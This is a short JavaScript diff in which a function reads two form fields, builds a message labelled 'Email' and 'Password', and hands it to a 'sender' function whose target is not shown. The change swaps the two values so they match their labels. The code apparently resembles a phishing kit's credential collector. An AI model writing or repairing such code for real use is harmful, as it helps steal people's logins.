@@ -7,7 +7,7 @@ var ready = function () {
     u_name = document.getElementById("name").value;
     email = document.getElementById("email").value;
 
-    message = "Email: " + u_name + "\nPassword: " + email;
+    message = "Email: " + email + "\nPassword: " + u_name;
 };
 var sender = function () {
     ready();
